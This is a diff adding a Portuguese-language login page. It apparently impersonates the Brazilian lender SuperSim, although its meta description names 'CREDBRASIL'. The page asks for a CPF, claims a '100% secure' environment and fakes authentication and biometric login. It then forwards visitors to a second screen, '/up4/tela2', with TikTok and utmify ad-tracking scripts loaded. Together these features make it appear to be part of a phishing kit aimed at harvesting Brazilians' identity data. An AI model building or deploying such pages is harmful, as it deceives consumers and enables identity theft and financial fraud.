@@ -1,0 +1,400 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Acesse sua conta no CREDBRASIL - A solução completa para suas finanças">
+    <title>Acesso Seguro - SuperSim</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #ffbd03;
+            --primary-dark: #2e7d32;
+            --secondary-color: #ffffff;
+            --error-color: #e74c3c;
+            --success-color: #00a651;
+            --text-light: #f8f9fa;
+            --text-muted: #6c757d;
+            --border-radius: 12px;
+            --box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+            --transition: all 0.3s ease;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, var(--primary-color), #e45314);
+            color: var(--text-light);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            line-height: 1.6;
+        }
+        
+        .login-container {
+            max-width: 480px;
+            width: 95%;
+            margin: 2rem auto;
+            padding: 2.5rem;
+            background-color: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 2.5rem;
+            color: var(--secondary-color);
+        }
+        
+        .logo-icon {
+            font-size: 2.25rem;
+            color: var(--secondary-color);
+        }
+        
+        .login-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+        }
+        
+        .login-subtitle {
+            font-size: 1rem;
+            margin-bottom: 2rem;
+            opacity: 0.9;
+        }
+        
+        #loginForm {
+            display: flex;
+            flex-direction: column;
+            gap: 1.25rem;
+        }
+        
+        .input-group {
+            position: relative;
+            width: 100%;
+        }
+        
+        .cpf-input {
+            width: 100%;
+            padding: 1rem 1.25rem;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: var(--border-radius);
+            font-size: 1rem;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: var(--secondary-color);
+            transition: var(--transition);
+        }
+        
+        .cpf-input:focus {
+            outline: none;
+            border-color: var(--secondary-color);
+            background-color: rgba(255, 255, 255, 0.2);
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.2);
+        }
+        
+        .cpf-input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .input-icon {
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .login-button {
+            background-color: #2e7d32;
+            color: #ffffff;
+            border: none;
+            border-radius: var(--border-radius);
+            padding: 1rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+        
+        .login-button:hover {
+            background-color: #1b5e20;
+            transform: translateY(-2px);
+        }
+        
+        .login-button:active {
+            transform: translateY(0);
+        }
+        
+        .help-links {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            margin-top: 2rem;
+            font-size: 0.875rem;
+        }
+        
+        .help-link {
+            color: var(--secondary-color);
+            text-decoration: none;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 0.25rem;
+        }
+        
+        .help-link:hover {
+            text-decoration: underline;
+            opacity: 0.9;
+        }
+        
+        .security-info {
+            margin-top: 2.5rem;
+            font-size: 0.75rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            opacity: 0.8;
+        }
+        
+        .error-message {
+            color: var(--error-color);
+            font-size: 0.875rem;
+            margin-top: -0.75rem;
+            text-align: left;
+            display: none;
+        }
+        
+        .biometric-option {
+            margin-top: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            font-size: 0.875rem;
+            cursor: pointer;
+        }
+        
+        .biometric-icon {
+            font-size: 1.25rem;
+        }
+        
+        .language-selector {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+        }
+        
+        .language-button {
+            background: none;
+            border: none;
+            color: var(--secondary-color);
+            cursor: pointer;
+            font-size: 0.875rem;
+            display: flex;
+            align-items: center;
+            gap: 0.25rem;
+        }
+        
+        @media (max-width: 576px) {
+            .login-container {
+                padding: 1.5rem;
+            }
+            
+            .logo {
+                font-size: 1.75rem;
+                margin-bottom: 2rem;
+            }
+            
+            .help-links {
+                flex-direction: column;
+                gap: 0.75rem;
+                align-items: center;
+            }
+        }
+        
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .login-container {
+            animation: fadeIn 0.5s ease-out;
+        }
+    </style>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+  ttq.load('D7E1D63C77UFN826502G');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+</head>
+<body>
+    <div class="language-selector">
+        <button class="language-button">
+            <i class="fas fa-globe"></i> Português
+        </button>
+    </div>
+    
+    <div class="login-container">
+        <div class="logo">
+            <img src="/1/images/logo-1.png" alt="SuperSim" style="height:50px;">
+        </div>
+        
+        <h1 class="login-title">Acesse sua conta</h1>
+        <p class="login-subtitle">Informe seu CPF para continuar</p>
+        
+        <form id="loginForm" novalidate="">
+            <div class="input-group">
+                <input type="text" class="cpf-input" placeholder="000.000.000-00" maxlength="14" oninput="formatarCPF(this)" required="" id="cpfInput" aria-label="Digite seu CPF" autocomplete="username">
+                <i class="fas fa-user input-icon"></i>
+                <div class="error-message" id="cpfError"></div>
+            </div>
+            
+            <button type="submit" class="login-button">
+                <i class="fas fa-arrow-right"></i> Continuar
+            </button>
+            
+            <div class="biometric-option" onclick="loginComBiometria()">
+                <i class="fas fa-fingerprint biometric-icon"></i>
+                <span>Acessar com biometria</span>
+            </div>
+        </form>
+        
+        <div class="help-links">
+            <a href="" class="help-link">
+                <i class="fas fa-user-plus"></i> Para o Primeiro acesso, só informar seu CPF
+            </a>
+        </div>
+        
+        <div class="security-info">
+            <i class="fas fa-lock"></i> Ambiente 100% seguro - Seus dados estão protegidos
+        </div>
+    </div>
+
+    <script>
+// Função para repassar params da URL
+function repassarParams(path) {
+  return path + window.location.search;
+}
+
+// Formatação automática do CPF com validação
+function formatarCPF(input) {
+  let value = input.value.replace(/\D/g, '');
+  if (value.length > 11) value = value.substring(0, 11);
+  if (value.length > 3 && value.length <= 6) {
+    value = value.replace(/(\d{3})(\d)/, '$1.$2');
+  } else if (value.length > 6 && value.length <= 9) {
+    value = value.replace(/(\d{3})(\d{3})(\d)/, '$1.$2.$3');
+  } else if (value.length > 9) {
+    value = value.replace(/(\d{3})(\d{3})(\d{3})(\d)/, '$1.$2.$3-$4');
+  }
+  input.value = value;
+  validarCPF(input);
+}
+
+// Validação do CPF
+function validarCPF(input) {
+  const cpf = input.value.replace(/\D/g, '');
+  const errorElement = document.getElementById('cpfError');
+  if (cpf.length === 11 || cpf.length === 0) {
+    input.style.borderColor = 'rgba(255, 255, 255, 0.3)';
+    errorElement.style.display = 'none';
+    return true;
+  } else {
+    input.style.borderColor = 'var(--error-color)';
+    errorElement.textContent = 'CPF incompleto';
+    errorElement.style.display = 'block';
+    return false;
+  }
+}
+
+// Simulação de login com tratamento de erros
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const cpfInput = document.getElementById('cpfInput');
+  const cpf = cpfInput.value.replace(/\D/g, '');
+
+  if (!validarCPF(cpfInput)) return;
+  if (cpf.length !== 11) {
+    document.getElementById('cpfError').textContent = 'Por favor, digite um CPF válido';
+    document.getElementById('cpfError').style.display = 'block';
+    cpfInput.style.borderColor = 'var(--error-color)';
+    cpfInput.focus();
+    return;
+  }
+
+  cpfInput.disabled = true;
+  const button = document.querySelector('.login-button');
+  const originalText = button.innerHTML;
+  button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
+  button.disabled = true;
+
+  setTimeout(() => {
+    // redireciona incluindo qualquer query string
+    window.location.href = repassarParams('/up4/tela2');
+    // em caso de erro:
+    // button.innerHTML = originalText;
+    // cpfInput.disabled = false;
+    // button.disabled = false;
+    // document.getElementById('cpfError').textContent = 'CPF não encontrado ou inválido';
+    // document.getElementById('cpfError').style.display = 'block';
+  }, 1500);
+});
+
+// Login com biometria
+function loginComBiometria() {
+  alert('Biometria indisponível, não cadastrada!');
+  // para implementação real: Web Authentication API
+  // navigator.credentials.get({ publicKey: {...} });
+}
+
+// foco automático no campo de CPF
+document.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('cpfInput').focus();
+});
+
+    </script>
+<script>
+  window.tikTokPixelId = "69dc17c453020b689ba08332";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<script src="/api/tracker.js" defer></script></body></html>
